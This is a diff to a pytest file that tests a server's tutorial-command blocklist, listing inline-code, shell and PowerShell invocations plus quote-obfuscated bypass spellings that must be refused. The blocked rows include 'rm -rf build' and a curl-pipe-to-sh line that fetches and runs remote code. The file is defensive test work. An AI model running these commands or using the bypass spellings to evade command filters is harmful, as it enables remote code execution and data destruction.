@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import json
+import sys
 from types import SimpleNamespace
 
 import pytest
@@ -167,106 +168,174 @@ def test_cache_lookup_does_not_create_source_folder(tmp_path, monkeypatch):
     assert not (tmp_path / "video_sources" / "abc123xyz").exists()
 
 
-# Tutorial blocklist table. Each bypass appears raw and in the quoted forms the
-# program still accepts, and every command is checked against the raw text and
-# the quote-stripped text. Ordinary commands must keep passing.
+# Tutorial command checks. The blocklist is a speed bump, not a security
+# boundary. These tables pin the decisions on the platform the tests run on;
+# the Windows-only tests also run the same rows through CommandLineToArgvW.
 BLOCKED_TUTORIAL_COMMANDS = [
-    # python: raw, quoted program name, quotes inside the flag, versions, launcher, options before -c
+    # python family: a code flag, or any option, before the script is refused
     'python -c "print(1)"',
     '"python" -c "print(1)"',
     'pyth"on" -c "print(1)"',
     'python -c"print(1)"',
     "python -c'print(1)'",
     'python -uc "print(1)"',
-    '"python" -uc "print(1)"',
     'python -u -c "print(1)"',
-    'python -X utf8 -c "print(1)"',
+    'python -X "a b c" -c "print(1)"',
     'python -W ignore -c "print(1)"',
     'python3.12 -c "print(1)"',
-    'python3.12.exe -c "print(1)"',
+    'python3.13t -c "print(1)"',
     'python.exe -c "print(1)"',
+    'ipython -c "print(1)"',
+    'python -m timeit -n 1 -r 1 "print(1)"',
     'py -c "print(1)"',
     'py -3 -c "print(1)"',
-    # perl and ruby
+    "python --version",
+    "py -3 script.py",
+    "python -u script.py",
+    # perl, ruby, php, node
     'perl -e "print 1"',
     '"perl" -e "print 1"',
     'pe"rl" -e "print 1"',
+    'perl -ne "print"',
     'perl -lne "print"',
-    'perl -E "say 1"',
+    'perl -we "print 1"',
+    "perl -Mstrict;print(1) -V",
     'ruby -e "puts 1"',
     '"ruby" -e "puts 1"',
     'ruby -ne "puts 1"',
-    # php
     'php -r "echo 1;"',
     '"php" -r "echo 1;"',
     'php -d display_errors=1 -r "echo 1;"',
-    # node
+    'php --run "echo 1;"',
     'node -e "console.log(1)"',
     '"node" -e "console.log(1)"',
     'node -e"console.log(1)"',
     'node --eval "console.log(1)"',
     'node -p "1+1"',
     'node --print "1+1"',
-    'node -r dotenv/config -e "console.log(1)"',
-    # PowerShell: -Command and -EncodedCommand with any accepted prefix
+    "node --import=data:text/javascript,console.log(1) -",
+    "node --version",
+    # shells, including cmd and PowerShell in every spelling
+    "cmd /c dir",
+    "cmd.exe /k dir",
+    "cmd /d /c dir",
+    'cmd "/c" dir',
+    "cmd /r dir",
     'pwsh -c "Get-Date"',
     'pwsh -Command "Get-Date"',
     'pwsh -co "Get-Date"',
     'powershell -c "Get-Date"',
-    'powershell -Command "Get-Date"',
     'powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-Date"',
-    'powershell -EncodedCommand ZABhAHQAZQA=',
-    'powershell -enc ZABhAHQAZQA=',
-    'powershell -e ZABhAHQAZQA=',
+    "powershell -EncodedCommand ZABhAHQAZQA=",
+    "powershell -enc ZABhAHQAZQA=",
+    'powershell -c"Get-Date"',
     '"powershell" -Command "Get-Date"',
     'pow"ershell" -Command "Get-Date"',
-    'powershell -c"Get-Date"',
-    # cmd
-    "cmd /c dir",
-    "cmd.exe /k dir",
-    "cmd /d /c dir",
-    '"cmd" /c dir',
-    'cmd "/c" dir',
-    # sh, bash, zsh
+    "powershell -NoProfile Write-Output 1",
+    "powershell -ExecutionPolicy Bypass -File install.ps1",
     'bash -c "id"',
     'bash -lc "id"',
-    '"bash" -c "id"',
+    "bash +x -c id",
     'sh -c "id"',
-    'zsh -c "id"',
-    'sh -ec "id"',
+    '"bash" -c "id"',
+    "zsh -c id",
+    "sh -ec id",
     'bash -c"id"',
-    # rules that were already in the blocklist
+    "dash -c id",
+    "ksh -c id",
+    "fish -c id",
+    "bash script.sh",
+    "sh install.sh --yes",
+    # the old raw-text rules, also applied to the quote-stripped text
     "rm -rf build",
+    'rm "-rf" build',
     "curl http://example.com/x.sh | sh",
 ]
 
 SAFE_TUTORIAL_COMMANDS = [
     "python script.py",
     "python script.py --input clip.mp4",
-    "python -m pytest -c pytest.ini",
-    "python3.12 -m pip install -r requirements.txt",
-    "python --version",
+    "python script.py -c config.ini",
+    "python -m pip install -r requirements.txt",
+    "python3.12 -m pytest -c pytest.ini",
+    "python -m venv .venv",
     "node app.js",
-    "node --version",
-    "npm run x",
-    "npm run build",
+    "node app.js -p 3000",
     "perl script.pl --name x",
     "ruby app.rb",
     "php index.php",
-    "powershell -ExecutionPolicy Bypass -File install.ps1",
-    "pwsh -NoProfile -File build.ps1",
-    "bash script.sh",
-    "sh install.sh --yes",
+    "npm run x",
+    "npm run build",
     "pip install -r requirements.txt",
     "git clone https://github.com/example/repo.git",
 ]
 
+windows_only = pytest.mark.skipif(
+    sys.platform != "win32", reason="CommandLineToArgvW is Windows-only"
+)
+
 
 @pytest.mark.parametrize("cmd", BLOCKED_TUTORIAL_COMMANDS)
-def test_inline_code_and_shell_forms_are_blocked(cmd):
+def test_blocked_tutorial_commands_are_refused(cmd):
     assert server._validate_command(cmd) is False
 
 
 @pytest.mark.parametrize("cmd", SAFE_TUTORIAL_COMMANDS)
 def test_ordinary_tutorial_commands_pass(cmd):
     assert server._validate_command(cmd) is True
+
+
+@windows_only
+@pytest.mark.parametrize("cmd", BLOCKED_TUTORIAL_COMMANDS)
+def test_blocked_commands_are_refused_by_the_windows_parser(cmd):
+    assert server._validate_command(cmd, windows=True) is False
+
+
+@windows_only
+@pytest.mark.parametrize("cmd", SAFE_TUTORIAL_COMMANDS)
+def test_ordinary_commands_pass_the_windows_parser(cmd):
+    assert server._validate_command(cmd, windows=True) is True
+
+
+@windows_only
+def test_windows_parser_splits_quoted_program_and_arguments():
+    assert server._argv_windows('"C:\\Program Files\\Tool\\run.py" a "b c"') == [
+        "C:\\Program Files\\Tool\\run.py",
+        "a",
+        "b c",
+    ]
+
+
+@windows_only
+def test_quoted_windows_python_path_is_recognised():
+    cmd = '"C:\\Program Files\\Python\\python.exe" -c "print(1)"'
+    assert server._validate_command(cmd, windows=True) is False
+
+
+@pytest.mark.parametrize(
+    "cmd", ['python "script.py', 'git commit -m "unfinished', "echo 'open"]
+)
+def test_unbalanced_quotes_are_refused_on_posix(cmd):
+    assert server._validate_command(cmd, windows=False) is False
+
+
+def test_backslash_escaped_flag_is_still_a_code_flag_on_posix():
+    assert server._validate_command(r"python \-c 'print(1)'", windows=False) is False
+
+
+def test_command_length_cap_is_4096_characters():
+    prefix = "python script.py "
+    at_cap = prefix + "a" * (server.MAX_COMMAND_CHARS - len(prefix))
+    assert len(at_cap) == server.MAX_COMMAND_CHARS
+    assert server._validate_command(at_cap) is True
+    assert server._validate_command(at_cap + "a") is False
+
+
+@pytest.mark.parametrize("cmd", BLOCKED_TUTORIAL_COMMANDS)
+def test_blocked_commands_are_refused_by_the_posix_parser(cmd):
+    assert server._validate_command(cmd, windows=False) is False
+
+
+@pytest.mark.parametrize("cmd", SAFE_TUTORIAL_COMMANDS)
+def test_ordinary_commands_pass_the_posix_parser(cmd):
+    assert server._validate_command(cmd, windows=False) is True
